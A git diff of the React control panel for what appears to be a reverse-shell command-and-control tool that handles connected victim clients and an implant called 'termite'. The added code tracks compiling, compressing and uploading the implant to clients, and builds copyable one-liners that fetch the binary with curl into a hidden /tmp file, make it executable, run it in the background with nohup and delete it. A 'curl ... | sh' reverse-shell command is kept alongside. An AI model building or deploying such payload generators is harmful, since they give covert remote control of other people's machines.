@@ -1,6 +1,5 @@
 import React from "react";
 import {
-  notification,
   message,
   InputNumber,
   Table,
@@ -8,15 +7,24 @@ import {
   Divider,
   Button,
   Tooltip,
+  Progress,
+  Input,
   Badge,
   Layout,
   Menu,
   Alert,
   Tabs,
+  List,
   Select,
+  Steps,
   Descriptions,
   Collapse,
 } from "antd";
+
+
+
+import { ControlOutlined, LockOutlined, UnlockOutlined } from '@ant-design/icons';
+
 
 import "./App.css";
 import qs from "qs";
@@ -29,6 +37,8 @@ const { TabPane } = Tabs;
 const { Option } = Select;
 const moment = require("moment");
 var W3CWebSocket = require("websocket").w3cwebsocket;
+var randomstring = require("randomstring");
+const { Step } = Steps;
 
 message.config({
   duration: 3,
@@ -39,9 +49,19 @@ message.config({
 const { Header, Content, Sider } = Layout;
 
 let endPoint = window.location.host;
+endPoint = "172.17.236.86:7331"
 let baseUrl = ["http://", endPoint].join("");
 let apiUrl = [baseUrl, "/api"].join("");
 let wsUrl = ["ws://", endPoint, "/notify"].join("");
+
+
+function upgradeToTermite(hash) {
+  axios
+    .get(apiUrl + "/client/" + hash + "/upgrade")
+    .then((response) => {
+      console.log(response)
+    })
+}
 
 const columns = [
   {
@@ -105,19 +125,45 @@ const columns = [
     title: "Action",
     key: "x",
     render: (data, line, index) => {
-      return (
-        <Button>
-          <a
-            href={baseUrl + "/shell/?" + line.hash}
-            target={"_blank"}
-            rel={"noreferrer noopener"}
-          >
-            Shell
-          </a>
+      let upgradeButton;
+      if (line.CurrentProcessKey === undefined) {
+        upgradeButton = <Button onClick={() => upgradeToTermite(line.hash)}>
+            Upgrade
         </Button>
+      } else {
+        upgradeButton = ""
+      }
+
+      return (
+        <>
+          <Button>
+            <a
+              href={baseUrl + "/shell/?" + line.hash}
+              target={"_blank"}
+              rel={"noreferrer noopener"}
+            >
+              Shell
+          </a>
+          </Button>
+          {upgradeButton}
+        </>
       );
     },
   },
+  {
+    title: "Progress",
+    dataIndex: "progress",
+    key: "progress",
+    align: "center",
+    render: (data, line, index) => {
+    return <>
+    <Alert message={line.alert == undefined ? "Press Upgrade to Proceed" : line.alert } type="success" />
+    <Progress percent={line.compiling_progress} size="small" status={line.compiling_progress == 100 ? "" : "active"} />
+    <Progress percent={line.compressing_progress} size="small" status={line.compressing_progress == 100 ? "" : "active"} />
+    <Progress percent={Math.round(line.progress)} size="small" status="active" status={line.progress == 100 ? "" : "active"} />
+    </>
+    },
+  }
 ];
 
 class App extends React.Component {
@@ -139,9 +185,10 @@ class App extends React.Component {
       .then((response) => {
         if (Object.values(response.data.msg).length > 0) {
           this.setState({
-            serversMap: response.data.msg,
-            serversList: Object.values(response.data.msg),
-            currentServer: Object.values(response.data.msg)[0],
+            serversMap: response.data.msg.servers,
+            serversList: Object.values(response.data.msg.servers),
+            currentServer: Object.values(response.data.msg.servers)[0],
+            distributor: response.data.msg.distributor
           });
         }
       })
@@ -165,23 +212,34 @@ class App extends React.Component {
       let CLIENT_CONNECTED = 0;
       let CLIENT_DUPLICATED = 1;
       let SERVER_DUPLICATED = 2;
-      console.log(e);
+      let COMPILING_TERMITE = 3;
+      let COMPRESSING_TERMITE = 4;
+      let UPLOADING_TERMITE = 5;
+
       let data = JSON.parse(e.data);
+
+      let serverHash, clientHash, newServersMap
+      
       switch (data.Type) {
         case CLIENT_CONNECTED:
           console.log(data);
           let onlinedClient = data.Data.Client;
-          let serverHash = data.Data.ServerHash;
+          serverHash = data.Data.ServerHash;
           message.success(
             "New client connected from: " +
-              onlinedClient.host +
-              ":" +
-              onlinedClient.port,
+            onlinedClient.host +
+            ":" +
+            onlinedClient.port,
             5
           );
 
-          let newServersMap = this.state.serversMap;
-          newServersMap[serverHash].clients[onlinedClient.hash] = onlinedClient;
+          newServersMap = this.state.serversMap;
+          if (newServersMap[serverHash].encrypted) {
+            newServersMap[serverHash].termite_clients[onlinedClient.hash] = onlinedClient;
+          } else {
+            newServersMap[serverHash].clients[onlinedClient.hash] = onlinedClient;
+          }
+
           _this.setState({
             serversMap: newServersMap,
           });
@@ -190,10 +248,10 @@ class App extends React.Component {
           let duplicatedClient = data.Data.Client;
           message.error(
             "Duplicated client connected from: " +
-              duplicatedClient.host +
-              ":" +
-              duplicatedClient.port +
-              ", connection reseted.",
+            duplicatedClient.host +
+            ":" +
+            duplicatedClient.port +
+            ", connection reseted.",
             5
           );
           break;
@@ -201,18 +259,70 @@ class App extends React.Component {
           let duplicatedServer = data.Data;
           message.error(
             "Duplicated server: " +
-              duplicatedServer.host +
-              ":" +
-              duplicatedServer.port,
+            duplicatedServer.host +
+            ":" +
+            duplicatedServer.port,
             5
           );
           break;
-        default:
-          notification.open({
-            message: "Error websocket message",
-            description: "Description",
-            duration: 0,
+
+        case COMPILING_TERMITE:
+          let compilingProgress = data.Data;
+          clientHash = compilingProgress.Client.hash;
+          serverHash = compilingProgress.ServerHash;
+          let cp = compilingProgress.Progress
+          
+          newServersMap = this.state.serversMap;
+          newServersMap[serverHash].clients[clientHash].compiling_progress = cp
+          if (newServersMap[serverHash].clients[clientHash].compiling_progress == 100) {
+            newServersMap[serverHash].clients[clientHash].alert = "Compile sucessfully!"
+          } else {
+            newServersMap[serverHash].clients[clientHash].alert = "Compiling..."
+          }
+
+          _this.setState({
+            serversMap: newServersMap,
           });
+          break
+        case COMPRESSING_TERMITE:
+          let compressingProgress = data.Data;
+          clientHash = compressingProgress.Client.hash;
+          serverHash = compressingProgress.ServerHash;
+          let p = compressingProgress.Progress
+
+          newServersMap = this.state.serversMap;
+          newServersMap[serverHash].clients[clientHash].compressing_progress = p
+
+          if (newServersMap[serverHash].clients[clientHash].compressing_progress == 100) {
+            newServersMap[serverHash].clients[clientHash].alert = "Compress successfully!"
+          } else {
+            newServersMap[serverHash].clients[clientHash].alert = "Compressing..."
+          }
+
+          _this.setState({
+            serversMap: newServersMap,
+          });
+          break
+        case UPLOADING_TERMITE:
+          let uploadingProgress = data.Data;
+          clientHash = uploadingProgress.Client.hash;
+          serverHash = uploadingProgress.ServerHash;
+          let bytesSent = uploadingProgress.BytesSent
+          let bytesTotal = uploadingProgress.BytesTotal
+
+          newServersMap = this.state.serversMap;
+          newServersMap[serverHash].clients[clientHash].progress = (bytesSent / bytesTotal) * 100;
+
+          if (newServersMap[serverHash].clients[clientHash].progress == 100) {
+            newServersMap[serverHash].clients[clientHash].alert = "Upgrade successfully!"
+          } else {
+            newServersMap[serverHash].clients[clientHash].alert = "Uploading..."
+          }
+          _this.setState({
+            serversMap: newServersMap,
+          });
+          break;
+        default:
           break;
       }
     };
@@ -257,7 +367,7 @@ class App extends React.Component {
           }
         >
           <Option value="0.0.0.0">0.0.0.0</Option>
-          {this.state.currentServer.interfaces.map((value, index) => {
+          {Object.values(this.state.currentServer.interfaces).map((value, index) => {
             return <Option value={value}>{value}</Option>;
           })}
         </Select>
@@ -276,6 +386,64 @@ class App extends React.Component {
         />
       );
     } else {
+      let hintTabs
+      if (this.state.currentServer.encrypted) {
+        hintTabs = <Tabs defaultActiveKey="0">
+        {this.state.distributor.interfaces.map((value, index) => {
+          let url = "http://" + value + ":" + this.state.distributor.port
+          let command, filename, path
+          let data = []
+          Object.values(this.state.currentServer.interfaces).map((value, index) => {
+            filename = "/tmp/." + randomstring.generate(4)
+            path = this.state.distributor.route[value]
+            command = "curl -fsSL " + url + "/" + path + "/termite -o " + filename + " && chmod +x " + filename + " && bash -c '/usr/bin/nohup " + filename + " &' && rm -rf " + filename
+            data.push({target: value + ":" + this.state.currentServer.port, command: command})
+            console.log(command)
+          })
+
+          let commands =     <List
+          size="small"
+          header={<div>Termite oneline command</div>}
+          footer={<div></div>}
+          bordered
+          dataSource={data}
+          renderItem={item => <List.Item>
+              {"Connect back: " + item.target}
+              <Input addonAfter={<CopyToClipboard
+                text={item.command}
+                onCopy={() => this.setState({ copied: true })}
+              >
+              <button>Click to copy</button>
+              </CopyToClipboard>
+              } defaultValue={item.command} />
+          </List.Item>}
+        />
+
+          return (
+            <TabPane tab={value} key={index}>
+              {commands}
+            </TabPane>
+          );
+        })}
+      </Tabs>
+      } else {
+        hintTabs = <Tabs defaultActiveKey="0">
+        {this.state.currentServer.interfaces.map((value, index) => {
+          let command = "curl http://" + value + ":" + this.state.currentServer.port + "|sh"
+          return (
+            <TabPane tab={value} key={index}>
+              <Tag>{command}</Tag>
+              <CopyToClipboard
+                text={command}
+                onCopy={() => this.setState({ copied: true })}
+              >
+                <button>Click to copy</button>
+              </CopyToClipboard>
+            </TabPane>
+          );
+        })}
+      </Tabs>
+      }
       hint = (
         <div>
           <Descriptions title="Server Info">
@@ -286,7 +454,7 @@ class App extends React.Component {
             </Descriptions.Item>
             <Descriptions.Item label="Clients">
               {this.state.currentServer
-                ? Object.keys(this.state.currentServer.clients).length
+                ? Object.keys(this.state.currentServer.clients).length + Object.keys(this.state.currentServer.termite_clients).length
                 : 0}
             </Descriptions.Item>
             <Descriptions.Item label="Started">
@@ -298,33 +466,36 @@ class App extends React.Component {
               header="Expand to show the reverse shell commands for the current server"
               key="1"
             >
-              <Tabs defaultActiveKey="0">
-                {this.state.currentServer.interfaces.map((value, index) => {
-                  let command = [
-                    "curl http://",
-                    value,
-                    ":",
-                    this.state.currentServer.port,
-                    " | sh",
-                  ].join("");
-                  return (
-                    <TabPane tab={value} key={index}>
-                      <Tag>{command}</Tag>
-                      <CopyToClipboard
-                        text={command}
-                        onCopy={() => this.setState({ copied: true })}
-                      >
-                        <button>Click to copy</button>
-                      </CopyToClipboard>
-                    </TabPane>
-                  );
-                })}
-              </Tabs>
+              {hintTabs}
             </Panel>
           </Collapse>
         </div>
       );
     }
+
+    let dataSource;
+    let table;
+    if (this.state.currentServer) {
+      if (this.state.currentServer.encrypted) {
+        dataSource = Object.values(this.state.currentServer.termite_clients)
+        table = <Table
+          columns={columns.slice(0, columns.length - 1)}
+          pagination={{ position: [this.state.bottom] }}
+          dataSource={dataSource}
+        />
+      } else {
+        dataSource = Object.values(this.state.currentServer.clients)
+        table = <Table
+          columns={columns}
+          pagination={{ position: [this.state.bottom] }}
+          dataSource={dataSource}
+        />
+      }
+    } else {
+      dataSource = []
+    }
+
+
 
     return (
       <Layout>
@@ -372,9 +543,9 @@ class App extends React.Component {
                       if (response.data.status) {
                         message.success(
                           "Server created at: " +
-                            response.data.msg.host +
-                            ":" +
-                            response.data.msg.port,
+                          response.data.msg.host +
+                          ":" +
+                          response.data.msg.port,
                           5
                         );
                         let newServer = response.data.msg;
@@ -406,25 +577,33 @@ class App extends React.Component {
               </Button>
 
               {this.state.serversList.map((value, index) => {
-                return (
-                  <>
-                    <Menu.Item
-                      key={value.hash}
-                      onClick={(item, key, keyPath, domEvent) => {
-                        this.setState({
-                          currentServer: this.state.serversMap[item.key],
-                        });
-                      }}
-                    >
-                      {value.host + ":" + value.port}
-                      <Badge
-                        count={Object.keys(value.clients).length}
-                        overflowCount={99}
-                        offset={[10, 0]}
-                      ></Badge>
-                    </Menu.Item>
-                  </>
-                );
+                let lockIcon;
+                if (value.encrypted) {
+                  lockIcon = <Tooltip title={"Secure Protocol"}>
+                    <LockOutlined style={{ color: "green" }} />
+                  </Tooltip>
+                } else {
+                  lockIcon = <Tooltip title={"Reverse Shell Protocol"}>
+                    <UnlockOutlined style={{ color: "red" }} />
+                  </Tooltip>
+
+                }
+                return <Menu.Item
+                  key={value.hash}
+                  onClick={(item, key, keyPath, domEvent) => {
+                    this.setState({
+                      currentServer: this.state.serversMap[item.key],
+                    });
+                  }}
+                >
+                  {lockIcon}
+                  {value.host + ":" + value.port}
+                  <Badge
+                    count={Object.keys(value.clients).length + Object.keys(value.termite_clients).length}
+                    overflowCount={99}
+                    offset={[10, 0]}
+                  ></Badge>
+                </Menu.Item>
               })}
             </Menu>
           </Sider>
@@ -432,15 +611,7 @@ class App extends React.Component {
             <Content style={{ margin: "0 0" }}>
               {hint}
               <Divider orientation="left"></Divider>
-              <Table
-                columns={columns}
-                pagination={{ position: [this.state.bottom] }}
-                dataSource={Object.values(
-                  this.state.currentServer
-                    ? this.state.currentServer.clients
-                    : []
-                )}
-              />
+              {table}
             </Content>
           </Layout>
         </Layout>
